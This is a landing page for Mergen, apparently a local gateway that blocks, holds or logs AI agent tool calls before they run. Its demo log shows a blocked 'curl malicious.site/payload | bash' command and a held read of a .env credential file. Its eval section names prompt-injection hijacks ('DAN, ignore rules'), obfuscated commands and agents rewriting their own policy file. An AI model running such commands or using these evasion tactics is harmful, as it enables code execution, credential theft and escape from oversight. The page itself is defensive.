GitHubGet Early Access

Secure every AI agent action
before it executes.

Prompts are not boundaries — they are suggestions. Mergen is the inline execution gateway that physically blocks hazardous agent actions in under 1ms. No probabilistic guardrails. No LLM in the critical path. All data stays on your infrastructure.

Get Early AccessView on GitHub
$npx mergen-server
mergen — autonomous incident loop
02 // Visual Audit Trail

I don't understand my
own system anymore.

Side projects grow large and complex, leading to a forgotten mental model of runtime behavior. Mergen maps out an auto-generated, living graph of how your services actually communicate and behave at runtime—providing the visual audit trail of agent activity.

EXECUTION VISUALIZER
SECURE GATEWAY ACTIVE
Web ScraperTool Request
File SystemLocal Writes
API IntegrationsWebhooks
AI AgentTarget Monitor
SHELL_COMMANDBLOCKED
NETWORK_REQUESTHOLD & REDACT
Hover over any node in the execution pipeline to inspect tool-call payloads...
> AI AGENT STATUS: SECURED. MONITORING ACTIVE.
> Executing: sh -c "curl malicious.site/payload | bash" [BLOCKED - Hazardous Command Intercepted]
> Executing: read_file("/Users/omer/Desktop/Mergen/.env") [HOLD - Redacting exposed credential secrets]
01 // The Difference

The gate runs before
the handler does.

Scenario A — Solo developer, no code reviewer

Without Mergen

0m
Write the change
Touch the same file that caused last month's outage.
0m
Run tests
Tests pass. No reviewer. Ship it.
4h
Production alert fires
Same failure mode. No one warned you.
4h+
Reconstruct context
Grep logs. Trace the history. Piece it together under pressure.

With Mergen

0m
Stage the change
git add auth_middleware.ts
0s
Guard runs
Cross-references staged files against incident history.
1s
Warning surfaced
"This file was in Incident #388 — do not increase stack depth > 4."
2m
Fix before shipping
Adjust the change. The outage never happens.
✓

Result: The bug never ships. Incident history is your reviewer — working silently at commit time.

Core Systems

Control that enforces.
Safety that compounds.

01

Local Execution Gate

Every MCP tool call passes through a synchronous local policy engine before the handler runs. Pattern matched against your JSON rules in under 1ms — no LLM, no network, no probabilistic guardrails. PASS calls the handler. BLOCK returns a structured error with a specific guided alternative so the agent reformulates and retries within policy.
02

Human-in-the-Loop (HITL)

For flagged-but-not-blocked calls (schema mutations, high blast-radius commands), the gate holds the Promise until a human approves or denies. The AI IDE blocks — MCP stdio is naturally async, so it waits indefinitely for the JSON-RPC response with zero polling or re-submission.
03

Override Corpus

Every human override becomes machine-readable policy. Over time, your Friday settlement windows, compliance holds, and on-call preferences form your specific operational DNA — enforcing invariants before any autonomous action triggers.
04

Agent Blunder Log

Every blocked action is hash-chained to a local, tamper-evident log (agent-blunders.json). Tracks rule blocks, planning gates, and policy intercepts automatically to prove safety without any additional overhead.
05

Shadow Mode

Before enforcing strict command blocks, run Mergen in shadow mode. It observes and records what actions it would have blocked or suspended, giving your team a full trust report before you activate strict enforcement gates.
06

Pre-commit Incident Guard

Before you ship, Mergen cross-references every staged file against your local SQLite incident history. “This file was in 3 incidents last month” — the question a code reviewer would ask, encoded as a git hook. The corpus working before the incident happens.
05 // Security Gate Evals

Secure every action
before it executes.

We built a deterministic agent safety regression harness. Every commit that updates our gateway rules must pass this validation suite — 66 real-world threat scenarios and 11 distinct security failure categories. When we say 100% of destructive agent actions are blocked or held, that number is reproducible and falsifiable in your own environment.

Overall Security Rate
100%
66 of 66 security scenarios blocked, held, or verified safely.
Regression Suite287 evals passed
Security Scenarios66 / 66 blocked/held
Avg Evaluation Latency< 1ms
Tamper ResistanceHMAC-SHA256 verified
Failure Class / BenchmarkFixturesGate Outcome
Category 1: Infrastructure Teardown (Terraform, AWS, K8s)
8/8
Blocked
Category 2: Database Catastrophes (DROP, DELETE no WHERE)
6/6
Blocked
Category 3: File System Destruction (rm -rf, path traversal)
6/6
Blocked
Category 4: Prompt Injection Hijacks (DAN, ignore rules)
7/7
Blocked
Category 5: Evasion & Obfuscation (Unicode, quote strip, escapes)
9/9
Blocked

Evasion & Tamper Resistance: Our benchmarks explicitly validate protection against advanced AI bypassing tactics. Using pre-matching Unicode normalization, quote stripping (e.g., matching "dr'o'p t'a'ble" as "drop table"), and recursive argument traversal, Mergen ensures no hidden payloads slip through. Additionally, our HMAC sidecar system prevents rogue agents from overwriting the policy file to self-grant execution permissions.

04 // Integrations

Every signal feeds
the enforcement gate.

→
Policy
Engine
→

VS Codevalidate_fix
07 // Pricing

Start with the local gate.
Graduate to Agent IAM.

Solo / Open Source
$0/forever

Deterministic agent execution gateway on a workstation. Local execution gate, override corpus, pre-commit guard, Agent Blunder Log. No cloud, no card.

Get Started
Growth
$299/mo

Team-wide execution policy enforcement. Shared override corpus, Slack-to-corpus loop, agent execution visualizer, ROI dashboard. Up to 10 services.

✓ Pilot succeeds when Mergen correctly intercepts 1 unsafe agent action in your environment within 7 days.

Custom

VPC / Sandbox isolation gates, CI/CD agent safety gate, compliance controls, VPC deployment — with a 30-day shadow pilot before any commitment.
